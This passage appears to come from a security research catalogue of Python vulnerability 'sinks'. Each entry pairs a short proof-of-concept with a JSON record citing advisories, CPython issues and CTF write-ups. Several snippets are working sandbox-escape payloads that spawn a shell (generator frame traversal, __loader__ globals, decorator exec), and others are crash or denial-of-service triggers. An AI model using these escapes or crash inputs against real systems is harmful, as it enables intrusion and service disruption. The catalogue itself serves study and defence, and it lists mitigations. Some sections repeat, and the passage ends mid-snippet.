**Risk**: Security hooks on `__getattribute__` don't cover the `getattr()`/`setattr()` builtins.

```python
# obj.attr          → Filtered
# getattr(obj, "attr")  → NOT filtered
getattr(user, "__class__")  # Bypasses attribute_filter
```
**Ref**: Lupa GHSA-69v7-xpr6-6gjm.

```json
{
  "sink_id": "PROTO-002",
  "category": "PROTO",
  "title": "getattr/setattr Hook Bypass",
  "severity": "high",
  "affected_versions": [
    "3.x"
  ],
  "sources": [
    {
      "type": "github_advisory",
      "url": "https://github.com/advisories/GHSA-69v7-xpr6-6gjm",
      "title": "Lupa sandbox attribute filter bypass via getattr/setattr",
      "author": "GitHub Advisory Database",
      "date": "2026-01-01",
      "ghsa": "GHSA-69v7-xpr6-6gjm",
      "verified": false,
      "tags": [
        "lupa",
        "getattr",
        "setattr",
        "hook-bypass",
        "sandbox-escape"
      ],
      "archived_path": "sources/PROTO-002/github.com_advisories_GHSA-69v7-xpr6-6gjm.md"
    }
  ],
  "confidence": "likely"
}
```


### `dir()` Index-Based Attribute Lookup
**Risk**: Substring blacklists never see blocked words generated at runtime via `dir()`.

```python
attrs = dir([])
i_class = attrs.index('__class__')
cls = getattr([], attrs[i_class])  # [].__class__ without typing the word
```
**Ref**: InCTF 2018.

```json
{
  "sink_id": "PROTO-003",
  "category": "PROTO",
  "title": "dir() Index-Based Attribute Lookup",
  "severity": "medium",
  "affected_versions": [
    "3.x"
  ],
  "sources": [
    {
      "type": "blog_post",
      "url": "https://docs.python.org/3/library/functions.html#dir",
      "title": "Built-in Functions — dir",
      "author": "Python Software Foundation",
      "date": "2026-04-29",
      "verified": true,
      "tags": [
        "dir",
        "attribute-enumeration",
        "blacklist-bypass",
        "pyjail",
        "ctf"
      ],
      "archived_path": "sources/PROTO-003/docs.python.org_3_library_functions.html.md"
    }
  ],
  "confidence": "confirmed"
}
```


### `vars()` Enumeration Bypass
**Risk**: `vars(object)` returns `object.__dict__`, allowing attribute modification without typing blocked strings.

```python
vars(controlled_object)['__class__'] = MaliciousClass
```

```json
{
  "sink_id": "PROTO-004",
  "category": "PROTO",
  "title": "vars() Enumeration Bypass",
  "severity": "medium",
  "affected_versions": [
    "3.x"
  ],
  "sources": [
    {
      "type": "blog_post",
      "url": "https://docs.python.org/3/library/functions.html#vars",
      "title": "Built-in Functions — vars",
      "author": "Python Software Foundation",
      "date": "2026-04-29",
      "verified": true,
      "tags": [
        "vars",
        "__dict__",
        "attribute-enumeration",
        "blacklist-bypass"
      ],
      "archived_path": "sources/PROTO-004/docs.python.org_3_library_functions.html.md"
    }
  ],
  "confidence": "confirmed"
}
```

---

## Race Condition Sinks


## Race Condition Sinks

### `filelock` Symlink TOCTOU (CVE-2025-68146)
**Risk**: `SoftFileLock._acquire()` checks permissions then opens the file — attacker can drop a symlink in between.

```python
# Attacker creates symlink during TOCTOU window
os.symlink(victim_file, lock_path)
# Victim's os.open follows symlink, truncates victim_file
```
**Refs**: GHSA-w853-jp5j-5j7f, Snyk SNYK-PYTHON-FILELOCK-14458335.

```json
{
  "sink_id": "RACE-001",
  "category": "RACE",
  "title": "filelock SoftFileLock Symlink TOCTOU",
  "severity": "high",
  "affected_versions": [
    "3.x"
  ],
  "sources": [
    {
      "type": "github_advisory",
      "url": "https://github.com/advisories/GHSA-w853-jp5j-5j7f",
      "title": "filelock symlink race in SoftFileLock._acquire",
      "author": "GitHub Advisory Database",
      "date": "2025-09-17",
      "cve_id": "CVE-2025-68146",
      "ghsa": "GHSA-w853-jp5j-5j7f",
      "verified": false,
      "tags": [
        "filelock",
        "symlink",
        "toctou",
        "race-condition"
      ],
      "archived_path": "sources/RACE-001/github.com_advisories_GHSA-w853-jp5j-5j7f.md"
    }
  ],
  "confidence": "likely"
}
```


### Import System Race: Stale Module Ref (gh-143650)
**Risk**: When a module import fails, other threads can receive a stale module reference.

```python
# Thread 1: adds X to sys.modules, import fails, removes X
# Thread 2: finds X in sys.modules, returns stale reference
```
**Ref**: CPython Issue #143650.

```json
{
  "sink_id": "RACE-002",
  "category": "RACE",
  "title": "Import System Race: Stale Module Reference",
  "severity": "medium",
  "affected_versions": [
    "3.13+"
  ],
  "sources": [
    {
      "type": "github_issue",
      "url": "https://github.com/python/cpython/issues/143650",
      "title": "Import failure can expose stale module reference to concurrent importers",
      "author": "python/cpython",
      "date": "2025-01-01",
      "gh_issue": "python/cpython#143650",
      "verified": false,
      "tags": [
        "import",
        "sys.modules",
        "race-condition",
        "threading"
      ],
      "archived_path": "sources/RACE-002/github.com_python_cpython_issues_143650.md"
    }
  ],
  "related_cves": [],
  "related_issues": [
    "python/cpython#143650"
  ],
  "mitigation": "Do not rely on partially initialized modules across threads; serialize imports when safety matters.",
  "confidence": "likely"
}
```


### `importlib.reload` Not Thread-Safe (gh-126548)
**Risk**: Concurrent reloads of the same module raise `ImportError`.

```json
{
  "sink_id": "RACE-003",
  "category": "RACE",
  "title": "`importlib.reload` Not Thread-Safe",
  "severity": "medium",
  "affected_versions": [
    "3.12+",
    "3.13+"
  ],
  "sources": [
    {
      "type": "github_issue",
      "url": "https://github.com/python/cpython/issues/126548",
      "title": "importlib.reload is not thread-safe for concurrent reloads",
      "author": "python/cpython",
      "date": "2024-10-01",
      "gh_issue": "python/cpython#126548",
      "verified": false,
      "tags": [
        "importlib",
        "reload",
        "threading",
        "race-condition"
      ],
      "archived_path": "sources/RACE-003/github.com_python_cpython_issues_126548.md"
    }
  ],
  "related_cves": [],
  "related_issues": [
    "python/cpython#126548"
  ],
  "mitigation": "Guard reload operations with a process-local lock and avoid concurrent reloading of the same module.",
  "confidence": "likely"
}
```


## Async / Generator Sinks

### Asyncio `Condition.notify()` vs `Task.cancel()` (gh-112202)
**Risk**: Lost wakeups causing deadlock/starvation.

```json
{
  "sink_id": "ASYNC-001",
  "category": "ASYNC",
  "title": "Asyncio `Condition.notify()` vs `Task.cancel()` Lost Wakeup",
  "severity": "medium",
  "affected_versions": [
    "3.11+",
    "3.12+"
  ],
  "sources": [
    {
      "type": "github_issue",
      "url": "https://github.com/python/cpython/issues/112202",
      "title": "asyncio Condition notify race with Task.cancel causes lost wakeups",
      "author": "python/cpython",
      "date": "2023-11-01",
      "gh_issue": "python/cpython#112202",
      "verified": false,
      "tags": [
        "asyncio",
        "condition",
        "cancel",
        "deadlock"
      ],
      "archived_path": "sources/ASYNC-001/github.com_python_cpython_issues_112202.md"
    }
  ],
  "related_cves": [],
  "related_issues": [
    "python/cpython#112202"
  ],
  "mitigation": "Treat cancellation around condition waits as unsafe and add higher-level retry or acknowledgement logic.",
  "confidence": "likely"
}
```


### asyncio.Task UAF via `__getattribute__` (gh-126080, gh-126138)
**Risk**: Missing incref on `task->task_context` before `call_soon` allows corruption.

```python
class Break:
    def __str__(self):
        raise RuntimeError("break")

async def target(): pass
async def main():
    task = asyncio.create_task(target())
    to_uaf = Break()
    task.__init__(target(), loop=asyncio.get_event_loop(), name=Break())
    del to_uaf
    await task  # segfault
```

```json
{
  "sink_id": "ASYNC-002",
  "category": "ASYNC",
  "title": "asyncio.Task Use-After-Free via Re-entrant Attribute Access",
  "severity": "high",
  "affected_versions": [
    "3.13+"
  ],
  "sources": [
    {
      "type": "github_issue",
      "url": "https://github.com/python/cpython/issues/126080",
      "title": "asyncio.Task missing incref can cause UAF during call_soon path",
      "author": "python/cpython",
      "date": "2024-10-01",
      "gh_issue": "python/cpython#126080",
      "verified": false,
      "tags": [
        "asyncio",
        "task",
        "uaf",
        "segfault"
      ],
      "archived_path": "sources/ASYNC-002/github.com_python_cpython_issues_126080.md"
    },
    {
      "type": "github_issue",
      "url": "https://github.com/python/cpython/issues/126138",
      "title": "Follow-up fix for asyncio.Task task_context lifetime bug",
      "author": "python/cpython",
      "date": "2024-10-01",
      "gh_issue": "python/cpython#126138",
      "verified": false,
      "tags": [
        "asyncio",
        "task",
        "lifetime",
        "call_soon"
      ],
      "archived_path": "sources/ASYNC-002/github.com_python_cpython_issues_126138.md"
    }
  ],
  "related_cves": [],
  "related_issues": [
    "python/cpython#126080",
    "python/cpython#126138"
  ],
  "mitigation": "Avoid reinitializing live Task objects and upgrade to versions with corrected reference management.",
  "confidence": "likely"
}
```


### Async Generator Concurrent Access Race (gh-117881)
**Risk**: `async_gen_athrow_throw` doesn't check `ag_running_async`, allowing concurrent access.

```json
{
  "sink_id": "ASYNC-003",
  "category": "ASYNC",
  "title": "Async Generator Concurrent Access Race",
  "severity": "medium",
  "affected_versions": [
    "3.11+",
    "3.12+",
    "3.13+"
  ],
  "sources": [
    {
      "type": "github_issue",
      "url": "https://github.com/python/cpython/issues/117881",
      "title": "async_gen_athrow_throw missing ag_running_async check",
      "author": "python/cpython",
      "date": "2024-04-01",
      "gh_issue": "python/cpython#117881",
      "verified": false,
      "tags": [
        "async-generator",
        "race-condition",
        "athrow",
        "asyncio"
      ],
      "archived_path": "sources/ASYNC-003/github.com_python_cpython_issues_117881.md"
    }
  ],
  "related_cves": [],
  "related_issues": [
    "python/cpython#117881"
  ],
  "mitigation": "Do not access a single async generator concurrently from multiple tasks until patched.",
  "confidence": "likely"
}
```


### asyncio.Timeout(0) Swallows Prior Cancellation (gh-134471)
**Risk**: `asyncio.timeout(0)` catches and processes a prior unrelated cancellation.

```json
{
  "sink_id": "ASYNC-004",
  "category": "ASYNC",
  "title": "`asyncio.timeout(0)` Swallows Prior Cancellation",
  "severity": "medium",
  "affected_versions": [
    "3.11+",
    "3.12+",
    "3.13+"
  ],
  "sources": [
    {
      "type": "github_issue",
      "url": "https://github.com/python/cpython/issues/134471",
      "title": "asyncio.timeout(0) can process an unrelated prior cancellation",
      "author": "python/cpython",
      "date": "2025-06-01",
      "gh_issue": "python/cpython#134471",
      "verified": false,
      "tags": [
        "asyncio",
        "timeout",
        "cancellation",
        "logic-bug"
      ],
      "archived_path": "sources/ASYNC-004/github.com_python_cpython_issues_134471.md"
    }
  ],
  "related_cves": [],
  "related_issues": [
    "python/cpython#134471"
  ],
  "mitigation": "Avoid zero-duration timeouts as cancellation boundaries in security-sensitive async control flow.",
  "confidence": "likely"
}
```


## CTF / Sandbox Escape Sinks

### Generator Frame `gi_frame` / Coroutine Frame `cr_frame` Bypass
**Risk**: Generator/coroutine frames expose `f_globals`/`f_builtins` for sandbox escape.

```python
foo.bar().gi_frame.f_globals['__builtins__'].exec('raise RuntimeError("hacked")')
```
**Ref**: simpleeval Issue #138.

```json
{
  "sink_id": "CTF-001",
  "category": "CTF",
  "title": "Generator and Coroutine Frame Globals Bypass",
  "severity": "high",
  "affected_versions": [
    "3.x"
  ],
  "sources": [
    {
      "type": "github_issue",
      "url": "https://github.com/danthedeckie/simpleeval/issues/138",
      "title": "Sandbox bypass via gi_frame/cr_frame access in simpleeval",
      "author": "danthedeckie/simpleeval",
      "date": "2024-01-01",
      "gh_issue": "danthedeckie/simpleeval#138",
      "verified": false,
      "tags": [
        "sandbox-escape",
        "frame-object",
        "gi_frame",
        "cr_frame"
      ],
      "archived_path": "sources/CTF-001/github.com_danthedeckie_simpleeval_issues_138.md"
    }
  ],
  "related_cves": [],
  "related_issues": [
    "danthedeckie/simpleeval#138"
  ],
  "mitigation": "For sandboxes, block frame-object access entirely rather than only removing builtins.",
  "confidence": "likely"
}
```

---

## CTF / Sandbox Escape Sinks


### Generator Frame Traversal
**Risk**: `gi_frame.f_back.f_back.f_globals` escapes `__builtins__={}` exec context.

```python
q = (q.gi_frame.f_back.f_back.f_globals for _ in [1])
g = [*q][0]
os = g['__builtins__']['__import__']('os')
os.system('sh')
```
**Ref**: DiceCTF 2024 IRS.

```json
{
  "sink_id": "CTF-002",
  "category": "CTF",
  "title": "Generator Frame Traversal Sandbox Escape",
  "severity": "high",
  "affected_versions": [
    "3.x"
  ],
  "sources": [
    {
      "type": "ctf_writeup",
      "url": "https://maplebacon.org/2024/02/dicectf2024-irs/",
      "title": "[DiceCTF 2024] IRS",
      "author": "Maple Bacon",
      "date": "2024-02-01",
      "verified": true,
      "tags": [
        "pyjail",
        "generator-frame",
        "sandbox-escape",
        "dicectf"
      ],
      "archived_path": "sources/CTF-002/maplebacon.org_2024_02_dicectf2024-irs.md"
    }
  ],
  "related_cves": [],
  "related_issues": [],
  "mitigation": "Block generator and frame introspection objects in jailed execution environments.",
  "confidence": "confirmed"
}
```


### Audit Hook Bypass via Signal Handler
**Risk**: Signal handlers receive a `frame` object directly, bypassing blocked `sys._getframe`.

```python
(s:=__import__('sys').modules['_signal']),
s.signal(2, lambda n,f: f.f_back.f_locals['hook'].__closure__[0].__setattr__('cell_contents', print)),
s.raise_signal(2)
```
**Refs**: ICTF 2024, CSAW Finals 2023.

```json
{
  "sink_id": "CTF-003",
  "category": "CTF",
  "title": "Audit Hook Bypass via Signal-Delivered Frame",
  "severity": "high",
  "affected_versions": [
    "3.x"
  ],
  "sources": [
    {
      "type": "ctf_writeup",
      "url": "https://blog.antoine.rocks/%F0%9F%91%A9%E2%80%8D%F0%9F%8F%ABwriteups/ictf%202024%20-%20all%20pyjails/",
      "title": "ICTF 2024 - All PyJails",
      "author": "Hey",
      "date": "2024-07-01",
      "verified": true,
      "tags": [
        "pyjail",
        "audit-hook",
        "signal",
        "frame"
      ],
      "archived_path": "sources/CTF-003/blog.antoine.rocks_%F0%9F%91%A9%E2%80%8D%F0%9F%8F%ABwriteups_ictf%202.md"
    },
    {
      "type": "ctf_writeup",
      "url": "https://wachter-space.de/2023/11/12/csaw23-python-jail-escape/",
      "title": "Python Jail Escape CSAW Finals 2023",
      "author": "Liam",
      "date": "2023-11-12",
      "verified": true,
      "tags": [
        "csaw",
        "audit-hook",
        "signal-handler",
        "sandbox-escape"
      ],
      "archived_path": "sources/CTF-003/wachter-space.de_2023_11_12_csaw23-python-jail-escape.md"
    }
  ],
  "related_cves": [],
  "related_issues": [],
  "mitigation": "Treat signal handlers as privileged frame-introspection gadgets and disable them inside sandboxes.",
  "confidence": "confirmed"
}
```


### Decorator AST Bypass
**Risk**: Decorators compile without generating explicit `ast.Call` nodes.

```python
@exec
@input
class A: pass
# Input: import os; os.system('cat flag.txt')
```
**Refs**: HKCERT CTF 2023, b01lers CTF 2023.

```json
{
  "sink_id": "CTF-004",
  "category": "CTF",
  "title": "Decorator-Based AST Call Filter Bypass",
  "severity": "high",
  "affected_versions": [
    "3.x"
  ],
  "sources": [
    {
      "type": "ctf_writeup",
      "url": "https://ctf.ulis.se/writeups/b01lers2023/rev/blacklist/",
      "title": "Blacklist",
      "author": "Lombax",
      "date": "2023-03-20",
      "verified": true,
      "tags": [
        "decorators",
        "ast-bypass",
        "pyjail",
        "b01lers"
      ],
      "archived_path": "sources/CTF-004/ctf.ulis.se_writeups_b01lers2023_rev_blacklist.md"
    },
    {
      "type": "ctf_writeup",
      "url": "https://github.com/jiegec/ctf-writeups/blob/master/docs/misc/pyjail.md",
      "title": "Python Jail Escape Techniques",
      "author": "jiegec",
      "date": "2025-01-01",
      "verified": true,
      "tags": [
        "decorators",
        "hkcert",
        "sandbox-escape",
        "exec"
      ],
      "archived_path": "sources/CTF-004/github.com_jiegec_ctf-writeups_blob_master_docs_misc_pyjail.m.md"
    }
  ],
  "related_cves": [],
  "related_issues": [],
  "mitigation": "Reject decorator syntax or validate compiled bytecode/AST after lowering, not only source-level call nodes.",
  "confidence": "confirmed"
}
```


## Stdlib Hidden Sinks

### `ast.literal_eval` — Not Truly Safe
**Risk**: C stack exhaustion and memory exhaustion.

```python
import ast
ast.literal_eval('(' * 1000 + '0' + ',)' * 1000)  # Crash
```
**Ref**: CPython Issue #95588.

```json
{
  "sink_id": "STDLIB-001",
  "category": "STDLIB",
  "title": "`ast.literal_eval` Denial of Service",
  "severity": "medium",
  "affected_versions": [
    "3.x"
  ],
  "sources": [
    {
      "type": "github_issue",
      "url": "https://github.com/python/cpython/issues/95588",
      "title": "ast.literal_eval is not safe against resource exhaustion",
      "author": "python/cpython",
      "date": "2022-08-01",
      "gh_issue": "python/cpython#95588",
      "verified": false,
      "tags": [
        "ast",
        "literal_eval",
        "dos",
        "stack-exhaustion"
      ],
      "archived_path": "sources/STDLIB-001/github.com_python_cpython_issues_95588.md"
    }
  ],
  "related_cves": [],
  "related_issues": [
    "python/cpython#95588"
  ],
  "mitigation": "Do not run literal_eval on untrusted input without strict size and recursion limits.",
  "confidence": "confirmed"
}
```


### `ctypes` Buffer Overflow (CVE-2021-3177)
**Risk**: `c_double.from_param(1e300)` overflows internal buffer.

```python
from ctypes import c_double
c_double.from_param(1e300)  # buffer overflow
```
**Ref**: CPython Issue #42938.

```json
{
  "sink_id": "STDLIB-002",
  "category": "STDLIB",
  "title": "`ctypes` `c_double.from_param` Buffer Overflow",
  "severity": "critical",
  "affected_versions": [
    "3.6",
    "3.7",
    "3.8",
    "3.9"
  ],
  "sources": [
    {
      "type": "cve",
      "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-3177",
      "title": "CVE-2021-3177: ctypes buffer overflow in PyCArg_repr / c_double.from_param",
      "author": "NVD",
      "date": "2021-02-15",
      "cve_id": "CVE-2021-3177",
      "verified": false,
      "tags": [
        "ctypes",
        "buffer-overflow",
        "memory-corruption",
        "float"
      ],
      "archived_path": "sources/STDLIB-002/nvd.nist.gov_vuln_detail_CVE-2021-3177.md"
    },
    {
      "type": "github_issue",
      "url": "https://github.com/python/cpython/issues/42938",
      "title": "ctypes buffer overflow with large float formatting",
      "author": "python/cpython",
      "date": "2021-01-16",
      "gh_issue": "python/cpython#42938",
      "verified": false,
      "tags": [
        "ctypes",
        "cpython",
        "overflow",
        "security-fix"
      ],
      "archived_path": "sources/STDLIB-002/github.com_python_cpython_issues_42938.md"
    }
  ],
  "related_cves": [
    "CVE-2021-3177"
  ],
  "related_issues": [
    "python/cpython#42938"
  ],
  "mitigation": "Upgrade CPython and avoid exposing ctypes conversion helpers to untrusted values.",
  "confidence": "confirmed"
}
```


### `http.server` — Multiple Issues
**Risk**: Open redirection (CVE-2021-28861), path disclosure, CGI OOM on Windows.

```json
{
  "sink_id": "STDLIB-003",
  "category": "STDLIB",
  "title": "`http.server` Multi-Issue Exposure",
  "severity": "medium",
  "affected_versions": [
    "3.x"
  ],
  "sources": [
    {
      "type": "cve",
      "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-28861",
      "title": "CVE-2021-28861: open redirection in Python http.server",
      "author": "NVD",
      "date": "2021-02-10",
      "cve_id": "CVE-2021-28861",
      "verified": false,
      "tags": [
        "http.server",
        "open-redirect",
        "cgi",
        "disclosure"
      ],
      "archived_path": "sources/STDLIB-003/nvd.nist.gov_vuln_detail_CVE-2021-28861.md"
    }
  ],
  "related_cves": [
    "CVE-2021-28861"
  ],
  "related_issues": [],
  "mitigation": "Do not expose http.server to untrusted clients; use a production-hardened HTTP stack instead.",
  "confidence": "confirmed"
}
```


### `subprocess` on Windows with Batch Files
**Risk**: Acts like `shell=True` even with `shell=False` when executing `.bat` files.

```python
subprocess.check_output(["C:/testscript.bat", "foo", "&&", "echo", "%PROGRAMFILES%"])
# && and %VAR% interpreted as shell metacharacters
```
**Ref**: Python Issue #33515.

```json
{
  "sink_id": "STDLIB-004",
  "category": "STDLIB",
  "title": "Windows Batch Files Behave Like `shell=True` in `subprocess`",
  "severity": "high",
  "affected_versions": [
    "3.x on Windows"
  ],
  "sources": [
    {
      "type": "github_issue",
      "url": "https://github.com/python/cpython/issues/33515",
      "title": "subprocess on Windows executes .bat files with shell semantics",
      "author": "python/cpython",
      "date": "2018-05-01",
      "gh_issue": "python/cpython#33515",
      "verified": false,
      "tags": [
        "subprocess",
        "windows",
        "batch",
        "command-injection"
      ],
      "archived_path": "sources/STDLIB-004/github.com_python_cpython_issues_33515.md"
    }
  ],
  "related_cves": [],
  "related_issues": [
    "python/cpython#33515"
  ],
  "mitigation": "Avoid passing untrusted arguments to .bat/.cmd targets; wrap with explicit escaping or avoid batch files entirely.",
  "confidence": "confirmed"
}
```


### `re` Module — Catastrophic Backtracking
**Risk**: Exponential backtracking in regex patterns. CVE-2024-6232 affects tarfile header parsing.

```python
import re
pattern = re.compile(r'(a+)+$')
pattern.match('a' * 30 + '!')  # CPU 100%
```

```json
{
  "sink_id": "STDLIB-005",
  "category": "STDLIB",
  "title": "Catastrophic Backtracking in `re` Consumers",
  "severity": "medium",
  "affected_versions": [
    "3.x"
  ],
  "sources": [
    {
      "type": "cve",
      "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-6232",
      "title": "CVE-2024-6232: tarfile header parsing vulnerable to ReDoS",
      "author": "NVD",
      "date": "2024-07-01",
      "cve_id": "CVE-2024-6232",
      "verified": false,
      "tags": [
        "regex",
        "redos",
        "tarfile",
        "backtracking"
      ],
      "archived_path": "sources/STDLIB-005/nvd.nist.gov_vuln_detail_CVE-2024-6232.md"
    }
  ],
  "related_cves": [
    "CVE-2024-6232"
  ],
  "related_issues": [],
  "mitigation": "Avoid backtracking-prone regexes on untrusted input and prefer linear-time parsers for archive metadata.",
  "confidence": "confirmed"
}
```

---


## Bleeding-Edge CPython Research (2022–2025)

### `atexit` Re-entrant `unregister()` UAF (gh-112127)
**Risk**: `__eq__` callback calls `atexit._clear()` during iteration, freeing the callback list.

```python
import atexit
class Evil:
    def __eq__(self, other):
        atexit._clear()
        return False
atexit.unregister(Evil())  # UAF
```

```json
{
  "sink_id": "CPYTHON-001",
  "category": "CPYTHON",
  "title": "`atexit.unregister()` Re-entrant Use-After-Free",
  "severity": "high",
  "affected_versions": [
    "3.12+"
  ],
  "sources": [
    {
      "type": "github_issue",
      "url": "https://github.com/python/cpython/issues/112127",
      "title": "Re-entrant atexit.unregister can free callback storage during iteration",
      "author": "python/cpython",
      "date": "2023-11-01",
      "gh_issue": "python/cpython#112127",
      "verified": false,
      "tags": [
        "atexit",
        "uaf",
        "reentrancy",
        "cpython"
      ],
      "archived_path": "sources/CPYTHON-001/github.com_python_cpython_issues_112127.md"
    }
  ],
  "related_cves": [],
  "related_issues": [
    "python/cpython#112127"
  ],
  "mitigation": "Avoid attacker-controlled equality hooks in atexit unregister paths and upgrade once patched.",
  "confidence": "likely"
}
```


### Bytecode OOB Read via `LOAD_FAST`
**Risk**: CPython doesn't validate opcode indices against actual tuple sizes.

```python
from opcode import opmap
import types

code = bytes([opmap["LOAD_FAST"], 51])  # index beyond co_names
codeobj = types.CodeType(0, 0, 0, 0, 0, 0, code, (), (), (), '', '', '', 0, b'', b'', (), ())
```
**Ref**: TSG CTF 2023 "bypy".

```json
{
  "sink_id": "CPYTHON-002",
  "category": "CPYTHON",
  "title": "Bytecode Out-of-Bounds Read via Forged `LOAD_FAST`",
  "severity": "high",
  "affected_versions": [
    "3.11",
    "3.12"
  ],
  "sources": [
    {
      "type": "ctf_writeup",
      "url": "https://github.com/jailctf/pyjail-collection",
      "title": "pyjail-collection",
      "author": "jailctf",
      "date": "2024-05-21",
      "verified": false,
      "tags": [
        "bytecode",
        "oob-read",
        "load_fast",
        "cpython"
      ],
      "archived_path": "sources/CPYTHON-002/github.com_jailctf_pyjail-collection.md"
    }
  ],
  "related_cves": [],
  "related_issues": [],
  "mitigation": "Block attacker-controlled code object construction and validate bytecode invariants before execution.",
  "confidence": "likely"
}
```

---

## Stdlib Hidden Sinks


### Re-entrant UAF in `_PyEval_LoadName` (gh-143236, 2025)
**Risk**: `frame.clear()` inside `__eq__` frees locals dict during name resolution.

```json
{
  "sink_id": "CPYTHON-003",
  "category": "CPYTHON",
  "title": "Re-entrant UAF in _PyEval_LoadName via frame.clear() during __eq__",
  "severity": "critical",
  "affected_versions": [
    "3.14-dev"
  ],
  "sources": [
    {
      "type": "github_issue",
      "url": "https://github.com/python/cpython/issues/143236",
      "title": "Re-entrant UAF in _PyEval_LoadName",
      "author": "python/cpython",
      "date": "2025-01-01",
      "gh_issue": "python/cpython#143236",
      "verified": false,
      "tags": [
        "cpython",
        "uaf",
        "re-entrancy",
        "name-resolution"
      ],
      "archived_path": "sources/CPYTHON-003/github.com_python_cpython_issues_143236.md"
    }
  ],
  "related_issues": [
    "python/cpython#143236"
  ],
  "mitigation": "Avoid invoking attacker-controlled equality or frame mutation during borrowed-pointer name resolution.",
  "confidence": "likely"
}
```


### Global Buffer Overflow in `bytearray_extend` (gh-143003, 2025)
**Risk**: `__length_hint__` returning 0 causes reuse of shared static buffer.

```json
{
  "sink_id": "CPYTHON-004",
  "category": "CPYTHON",
  "title": "Global buffer overflow in bytearray_extend via crafted __length_hint__",
  "severity": "critical",
  "affected_versions": [
    "3.14-dev"
  ],
  "sources": [
    {
      "type": "github_issue",
      "url": "https://github.com/python/cpython/issues/143003",
      "title": "Global Buffer Overflow in bytearray_extend",
      "author": "python/cpython",
      "date": "2025-01-01",
      "gh_issue": "python/cpython#143003",
      "verified": false,
      "tags": [
        "cpython",
        "buffer-overflow",
        "bytearray",
        "length-hint"
      ],
      "archived_path": "sources/CPYTHON-004/github.com_python_cpython_issues_143003.md"
    }
  ],
  "related_issues": [
    "python/cpython#143003"
  ],
  "mitigation": "Treat length hints as untrusted and avoid shared-buffer reuse without strict bounds validation.",
  "confidence": "likely"
}
```


### `gc.get_objects` Corrupts GC in Free-Threaded Python (gh-125859, 2024)
**Risk**: New class of bugs unique to Python 3.13t (`--disable-gil`).

```json
{
  "sink_id": "CPYTHON-005",
  "category": "CPYTHON",
  "title": "gc.get_objects corruption in free-threaded Python GC state",
  "severity": "high",
  "affected_versions": [
    "3.13t"
  ],
  "sources": [
    {
      "type": "github_issue",
      "url": "https://github.com/python/cpython/issues/125859",
      "title": "gc.get_objects Corrupts GC in Free-Threaded Python",
      "author": "python/cpython",
      "date": "2024-01-01",
      "gh_issue": "python/cpython#125859",
      "verified": false,
      "tags": [
        "cpython",
        "gc",
        "free-threaded",
        "disable-gil"
      ],
      "archived_path": "sources/CPYTHON-005/github.com_python_cpython_issues_125859.md"
    }
  ],
  "related_issues": [
    "python/cpython#125859"
  ],
  "mitigation": "Avoid exposing or iterating mutable GC internals without thread-safe synchronization in free-threaded builds.",
  "confidence": "likely"
}
```


### `STORE_ATTR_WITH_HINT` UAF via `__del__` (gh-123083, 2024)
**Risk**: `Py_XDECREF` triggers `__del__` which mutates the dict being modified.

```json
{
  "sink_id": "CPYTHON-006",
  "category": "CPYTHON",
  "title": "STORE_ATTR_WITH_HINT UAF via re-entrant __del__ during DECREF",
  "severity": "critical",
  "affected_versions": [
    "3.13-dev"
  ],
  "sources": [
    {
      "type": "github_issue",
      "url": "https://github.com/python/cpython/issues/123083",
      "title": "STORE_ATTR_WITH_HINT UAF via __del__",
      "author": "python/cpython",
      "date": "2024-01-01",
      "gh_issue": "python/cpython#123083",
      "verified": false,
      "tags": [
        "cpython",
        "uaf",
        "__del__",
        "dict-mutation"
      ],
      "archived_path": "sources/CPYTHON-006/github.com_python_cpython_issues_123083.md"
    }
  ],
  "related_issues": [
    "python/cpython#123083"
  ],
  "mitigation": "Do not keep stale dictionary pointers across decref paths that can invoke user destructors.",
  "confidence": "likely"
}
```

---

## Cross-Cutting Patterns

1. **Re-entrancy dominates**: Every major recent CPython bug involves `__del__`/`__eq__`/`__getattribute__` callbacks running while C code holds stale pointers.
2. **AST gaps**: Decorators, subscripts (`[]`), and augmented assignments (`+=`) compile to different AST nodes than direct calls. Sandboxes inspecting only `ast.Call` miss these paths.
3. **Free-threaded Python (3.13t)** introduces concurrency bugs unknown to mainstream Python.
4. **Type confusion at the file format level**: ZIP polyglots show that Python's file type detection (magic bytes) can be exploited.

---

## Extended Niche Sinks — Round 2 Research (2026-04-29)

The following sinks were discovered by navigating entire blog posts, CTF writeups, and security research papers in depth. Each includes full code examples and exact source citations.

---


## Extended Niche Sinks — Round 2 Research (2026-04-29)

### ZIP/Polyglot File Execution
**Risk**: Python executes ZIP archives directly. EOCD comment field allows arbitrary trailing Python code.

```python
# File is both valid Python script AND valid ZIP with __main__.py
# python archive.zip executes __main__.py
```
**Ref**: UIUCTF 2025 "comments-only".

```json
{
  "sink_id": "CTF-005",
  "category": "CTF",
  "title": "ZIP/Polyglot File Execution via Python Launcher",
  "severity": "medium",
  "affected_versions": [
    "3.x"
  ],
  "sources": [
    {
      "type": "ctf_writeup",
      "url": "https://github.com/jailctf/pyjail-collection",
      "title": "pyjail-collection",
      "author": "jailctf",
      "date": "2024-05-21",
      "verified": false,
      "tags": [
        "zip",
        "polyglot",
        "__main__",
        "pyjail"
      ],
      "archived_path": "sources/CPYTHON-002/github.com_jailctf_pyjail-collection.md"
    }
  ],
  "related_cves": [],
  "related_issues": [],
  "mitigation": "Do not treat uploaded files as inert based solely on extension; forbid direct execution of ZIP-capable inputs.",
  "confidence": "theoretical"
}
```


### `__loader__` Access for Real Builtins
**Risk**: Import machinery bootstrap variables survive even when `__builtins__` is globally overwritten.

```python
__loader__.SourceFileLoader.get_data.__globals__["_os"].system("sh")
```
**Ref**: ALLES! CTF 2020.

```json
{
  "sink_id": "CTF-006",
  "category": "CTF",
  "title": "`__loader__` Access to Real Builtins and OS Primitives",
  "severity": "high",
  "affected_versions": [
    "3.x"
  ],
  "sources": [
    {
      "type": "ctf_writeup",
      "url": "https://github.com/ljagiello/ctf-skills/blob/main/ctf-misc/pyjails.md",
      "title": "ctf-skills pyjails.md",
      "author": "ljagiello",
      "date": "2024-01-01",
      "verified": true,
      "tags": [
        "__loader__",
        "builtins",
        "importlib",
        "sandbox-escape"
      ],
      "archived_path": "sources/CTF-006/github.com_ljagiello_ctf-skills_blob_main_ctf-misc_pyjails.md.md"
    }
  ],
  "related_cves": [],
  "related_issues": [],
  "mitigation": "Remove or wrap import-loader globals when constructing restricted execution contexts.",
  "confidence": "likely"
}
```


### `dir()` Attribute Lookup Escape
**Risk**: Substring blacklists never see blocked words generated at runtime via `dir()`.

```python
attrs = dir([])
i_class = attrs.index('__class__')
